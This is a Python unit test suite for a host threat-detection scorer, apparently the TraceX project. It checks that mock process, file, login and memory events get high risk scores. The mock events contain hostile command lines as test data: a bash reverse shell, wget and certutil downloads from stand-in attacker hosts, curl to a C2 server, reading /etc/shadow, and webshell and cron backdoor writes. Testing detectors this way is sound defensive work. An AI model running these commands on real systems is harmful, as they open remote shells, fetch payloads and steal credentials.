import sys
import os
import unittest
import logging

# 确保能导入项目模块
sys.path.append(os.getcwd())

try:
    from analyzer.attack_analyzer.context_engine import ContextEngine
except ImportError:
    print("❌ 无法导入 ContextEngine，请在 TraceX 根目录下运行")
    sys.exit(1)

# 配置日志输出
logging.basicConfig(level=logging.INFO, format='%(message)s')

class MockESClient:
    """模拟 ES 客户端，用于脱离数据库测试核心评分逻辑"""
    def __init__(self):
        self.es = None

class TestHostCollectorFull(unittest.TestCase):
    """
    组员1 (主机采集) 全功能验证套件
    覆盖：Linux 进程/文件/网络/持久化/登录、Windows 事件、内存防御
    """
    
    def setUp(self):
        self.engine = ContextEngine(MockESClient())
        print("\n" + "="*80)

    def _verify(self, category, case_name, mock_event, min_score, keywords):
        """通用验证助手"""
        print(f"🧪 [{category}] 测试场景: {case_name}")
        
        # 执行评分
        result = self.engine.evaluate_threat(mock_event)
        score = result['score']
        reasons = result['reasons']
        
        # 打印结果
        print(f"   📊 评分: {score} | 等级: {result['severity'].upper()}")
        print(f"   📝 依据: {reasons}")
        
        # 断言
        try:
            self.assertGreaterEqual(score, min_score, f"分数过低 (预期 >={min_score})")
            
            if isinstance(keywords, str): keywords = [keywords]
            hit = False
            for k in keywords:
                if any(k.lower() in r.lower() for r in reasons):
                    hit = True
                    break
            
            if not hit:
                self.fail(f"缺失关键词: {keywords}")
            
            print("   ✅ [PASS]")
        except AssertionError as e:
            print(f"   ❌ [FAIL] {e}")
            raise e

    # =========================================================================
    # 1. Linux 进程与命令威胁 (Process & Command)
    # =========================================================================
    
    def test_01_reverse_shell(self):
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {"name": "bash", "command_line": "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"}
        }
        self._verify("Process", "反弹 Shell (Bash TCP)", event, 85, "Reverse Shell")

    def test_02_dangerous_tool_ncat(self):
        event = {
            "event": {"category": "process"},
            "process": {"name": "ncat", "command_line": "ncat -l -p 8080"}
        }
        self._verify("Process", "黑客工具 (Ncat)", event, 70, "Dangerous Tool")

    def test_03_suspicious_download_wget(self):
        event = {
            "event": {"category": "process"},
            "process": {"name": "wget", "command_line": "wget http://evil.com/trojan.sh"}
        }
        self._verify("Process", "可疑下载 (Wget)", event, 60, "Suspicious Tool")

    def test_04_low_priv_user_abuse(self):
        event = {
            "event": {"category": "process"},
            "user": {"name": "www-data"},
            "process": {"name": "curl", "command_line": "curl http://c2.server/cmd"}
        }
        self._verify("Process", "低权用户异常 (www-data curl)", event, 75, "Low-Priv User")

    # =========================================================================
    # 2. Linux 文件与 WebShell 威胁 (File & WebShell)
    # =========================================================================

    def test_05_webshell_command(self):
        event = {
            "event": {"category": "process", "action": "process_started"},
            "process": {"name": "cp", "command_line": "cp source.txt /var/www/html/shell.php"}
        }
        self._verify("File", "WebShell 命令行写入", event, 85, "WebShell Pattern")

    def test_06_webshell_write_event(self):
        event = {
            "event": {"category": "file", "action": "write"},
            "file": {"path": "/var/www/html/backdoor.jsp", "extension": "jsp"}
        }
        self._verify("File", "WebShell 文件写入事件", event, 90, "WebShell Write")

    def test_07_sensitive_file_read(self):
        event = {
            "event": {"category": "process"},
            "process": {"name": "cat", "command_line": "cat /etc/shadow"}
        }
        # [Fix] 这里的关键词改为 "Sensitive"，以匹配 "Sensitive/Persistence File Access"
        self._verify("File", "敏感文件读取 (/etc/shadow)", event, 70, "Sensitive")

    # =========================================================================
    # 3. 持久化后门 (Persistence)
    # =========================================================================

    def test_08_cron_persistence(self):
        event = {
            "event": {"category": "file", "action": "write"},
            "file": {"path": "/etc/cron.d/backdoor"},
            "process": {"command_line": "echo ... > /etc/cron.d/backdoor"}
        }
        self._verify("Persistence", "Cron 计划任务写入", event, 70, "Persistence")

    def test_09_rc_local_modification(self):
        event = {
            "event": {"category": "file", "action": "write"},
            "file": {"path": "/etc/rc.local"}
        }
        self._verify("Persistence", "启动项修改 (rc.local)", event, 70, "Persistence")

    # =========================================================================
    # 4. Windows 威胁 (EventID 4688)
    # =========================================================================

    def test_10_win_powershell_encoded(self):
        event = {
            "event": {"category": "process", "dataset": "windows"},
            "process": {"name": "powershell.exe", "command_line": "powershell.exe -enc aGVsbG8="}
        }
        self._verify("Windows", "PowerShell 编码指令", event, 70, "PowerShell Encoded")

    def test_11_win_certutil_lotl(self):
        event = {
            "event": {"category": "process", "dataset": "windows"},
            "process": {"name": "certutil.exe", "command_line": "certutil -urlcache -split http://evil.exe"}
        }
        self._verify("Windows", "Certutil 下载 (LotL)", event, 65, "Certutil")

    # =========================================================================
    # 5. 身份认证与兼容性 (Auth & Agent)
    # =========================================================================

    def test_12_root_remote_login(self):
        event = {
            "event": {"category": "authentication", "action": "login", "outcome": "success"},
            "user": {"name": "root"},
            "source": {"ip": "192.168.1.50"}
        }
        self._verify("Auth", "Root 远程登录", event, 60, "Root Remote Login")

    def test_13_login_bruteforce_indicator(self):
        event = {
            "event": {"category": "authentication", "action": "login", "outcome": "failure"},
            "user": {"name": "admin"}
        }
        self._verify("Auth", "登录失败 (暴力破解迹象)", event, 40, "Login Failure")

    def test_14_agent_severity_compatibility(self):
        """测试是否兼容组员1 Agent 直接上报的整数评分"""
        event = {
            "event": {"category": "process", "severity": 8}, # Agent report severity: 8
            "process": {"name": "useradd"}
        }
        self._verify("Agent", "Agent 整数评分兼容性", event, 80, "Agent Reported Severity")

    # =========================================================================
    # 6. 内存防御 (MemDefense)
    # =========================================================================

    def test_15_memdefense_critical(self):
        event = {
            "event": {"category": "memory", "dataset": "mem_scanner"},
            "memory": {"anomalies": [{"type": "ELF_HEADER", "risk_level": "CRITICAL"}]}
        }
        self._verify("Memory", "内存无文件攻击 (Critical)", event, 100, "MemDefense")

    def test_16_memdefense_high(self):
        event = {
            "event": {"category": "memory"},
            "memory": {"anomalies": [{"type": "RWX_REGION", "risk_level": "HIGH"}]}
        }
        self._verify("Memory", "内存 RWX 异常 (High)", event, 90, "MemDefense")

if __name__ == '__main__':
    print("🚀 TraceX 主机采集全功能验证开始...")
    unittest.main(verbosity=0)
